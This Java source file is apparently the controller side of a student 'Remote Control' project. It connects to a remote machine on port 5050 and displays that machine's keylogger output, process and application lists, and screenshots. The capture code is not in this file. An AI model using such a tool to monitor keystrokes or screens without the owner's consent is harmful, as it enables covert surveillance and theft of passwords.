package Client;
import gui.*;
import java.awt.*;
import java.io.IOException;
import javax.imageio.ImageIO;
import javax.swing.*;
import java.io.*;
import java.net.*;
import java.io.BufferedReader;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.awt.image.BufferedImage;

import java.io.ObjectInputStream;
import java.net.Socket;

public class Client {
    public static ObjectInputStream objectInputStream;

    public static Socket clientSocket;
    public BufferedReader inFromClient;
    public PrintWriter outToClient;
    private Date date = null;
    public static final String DIR_NAME = "SACHIN";

    public String filepath;
    public Client(String ip) {

        try {

            clientSocket = new Socket(ip,5050);
            System.out.println("connected");

            inFromClient = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
            outToClient = new PrintWriter(clientSocket.getOutputStream());


        } catch (IOException e) {
            System.out.println("Error " + e);
        }
    }
    public void ReceiveKeyLogger() throws IOException {
        System.out.println("thanh cong");
        System.out.println("thanh cong done");




        String str = "The quick brown fox ";
        JFrame f= new JFrame("Keylogger");
        f.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        TextArea area=new TextArea("str");
        area.setBounds(10,30, 300,300);
        f.add(area);
        f.setSize(600,600);




        f.setVisible(true);

//        FileWriter filewriter = new FileWriter("clientOutputFile.txt");
//        BufferedWriter bufferedWriter = new BufferedWriter(filewriter);
        /*
        Here client records all the data received from the client
         */
//        String str = "KeyLogger";
        System.out.println("in di");
        objectInputStream = new ObjectInputStream(clientSocket.getInputStream());
//        String appendText = "jumps over the lazy dog.";
        while (clientSocket.isConnected() ){
            try {
                System.out.println("chuan bi nhan");
                str = receiveMg();
//                String appendText = "jumps over the lazy dog.";
                    area.append(str + "\r\n");
              //  str = inFromClient.readLine();; // here error
            } catch (IOException e) {
                System.out.println("Error bi chi ri" + e);
            }
            System.out.println("Received : " + str );
//           bufferedWriter.write(str + "\r\n");t
//           bufferedWriter.flush();
//           bufferedWriter.flush();
        }
//       bufferedWriter.close();
//       welcomeSocket.close();
        System.out.println("Connection closed");
    }




    public String receiveMg() throws IOException {
        String mg = "";
        String l = inFromClient.readLine();
        System.out.println(mg);

        mg += l;
        System.out.println(mg);

        while ((l = inFromClient.readLine()) != null) {
            System.out.println(l);

            if (l.compareTo("done") == 0) {
                break;
            }
            mg += '\n' + l;
        }
        // System.out.println("Client received: "+ mg);
        System.out.println(mg);
        return mg;
    }

    public void sendMg(String MgToSend) throws IOException {
        outToClient.write(MgToSend);
        outToClient.write('\n');
        outToClient.write("done");
        outToClient.write('\n');
        outToClient.flush();

    }

    private void closeSendReceive() throws IOException {
        inFromClient.close();
        outToClient.close();
        clientSocket.close();
    }

    public String printAllProcess() throws IOException {
        String pr = "";
        String cur = "";
        cur = receiveMg();
        pr += cur + '\n';
        while (cur != "\n") {
            cur = receiveMg();
            if (cur.equals("Done") == true) break;
            pr += cur + '\n';
            //System.out.println(pr);
            //  sendMg("Received");
        }
        System.out.println(pr);
        return pr;
    }

    public String printAllApp() throws IOException {
        String app = "";
        String cur = receiveMg();
        app += cur + '\n';
        while (cur != "\n") {
            cur = receiveMg();
            if (cur.equals("Done") == true) break;
            app += cur + '\n';
        }
        System.out.println(app);
        return app;
    }

    public String ScreenShoot() throws IOException{
        String check = "";
        try
        {
            System.out.println("wait...");
//            connectionSocket = welcomeSocket.accept();
//            System.out.println("accepted");

            date = new Date();
            DateFormat dateFormat = new SimpleDateFormat("_yyMMdd_HHmmss");
            //String fileName = clientSocket.getInetAddress().getHostName().replace(".", "-");
            String fileName ="ScreenShoot";
            System.out.println(fileName);
            BufferedImage img= ImageIO.read(ImageIO.createImageInputStream(clientSocket.getInputStream()));
            System.out.println("hihi");
            filepath =  fileName+ dateFormat.format(date)+".png";
            ImageIO.write(img, "png", new File(fileName+ dateFormat.format(date)+".png"));
            System.out.println("Image received!!!!");//"E:\\mmt\\"+
            check = "successfull";



        }
        catch(SocketTimeoutException st)
        {
            System.out.println("Socket timed out!");

        }
        catch(IOException e)
        {
            e.printStackTrace();
            check = "failed";


        }
        catch(Exception ex)
        {
            System.out.println(ex);
            check = "failed";

        }
        return check;

    }


    public static void main(String[] args) throws IOException {
       // Client sv;
        GUI gui = new GUI("Remote Control");
        gui.setSize(800,500);
        gui.setVisible(true);

    }
    private void createDirectory(String dirName) {
        File newDir = new File("D:\\"+dirName);
        if(!newDir.exists()){
            boolean isCreated = newDir.mkdir();
        }
    }
}
